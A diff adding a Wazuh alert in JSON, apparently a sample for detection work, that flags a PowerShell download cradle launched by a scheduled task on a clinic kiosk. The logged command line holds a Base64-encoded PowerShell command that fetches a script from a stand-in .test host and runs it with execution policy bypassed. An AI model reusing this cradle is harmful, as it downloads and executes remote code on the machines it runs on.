@@ -1,0 +1,70 @@
+{
+  "timestamp": "2026-09-18T19:30:02.877+0000",
+  "rule": {
+    "level": 10,
+    "description": "PowerShell download cradle started by a scheduled task",
+    "id": "100014",
+    "mitre": {
+      "id": [
+        "T1059.001"
+      ],
+      "tactic": [
+        "Execution"
+      ],
+      "technique": [
+        "PowerShell"
+      ]
+    },
+    "firedtimes": 1,
+    "groups": [
+      "windows",
+      "sysmon",
+      "sysmon_event1",
+      "powershell"
+    ]
+  },
+  "agent": {
+    "id": "012",
+    "name": "CLINIC-KIOSK01",
+    "ip": "192.0.2.52"
+  },
+  "manager": {
+    "name": "wazuh-manager"
+  },
+  "id": "1789759802.131977",
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "location": "EventChannel",
+  "data": {
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-Sysmon",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "eventID": "1",
+        "version": "5",
+        "level": "4",
+        "task": "1",
+        "opcode": "0",
+        "systemTime": "2026-09-18T19:30:02.3305518Z",
+        "eventRecordID": "9024",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "computer": "CLINIC-KIOSK01",
+        "severityValue": "INFORMATION"
+      },
+      "eventdata": {
+        "utcTime": "2026-09-18 19:30:02.330",
+        "processId": "3188",
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "originalFileName": "PowerShell.EXE",
+        "commandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBmAGkAbABlAHMALgBoAGUAbABwAGQAZQBzAGsALQB0AG8AbwBsAHMALgB0AGUAcwB0AC8AawAuAHAAcwAxACcAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAGUAbgB2ADoAVABFAE0AUABcAGsALgBwAHMAMQA7ACAAJgAgACQAZQBuAHYAOgBUAEUATQBQAFwAawAuAHAAcwAxAA==",
+        "currentDirectory": "C:\\Windows\\system32\\",
+        "user": "CLINIC\\kioskuser",
+        "integrityLevel": "Medium",
+        "parentProcessId": "1120",
+        "parentImage": "C:\\Windows\\System32\\svchost.exe",
+        "parentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"
+      }
+    }
+  }
+}
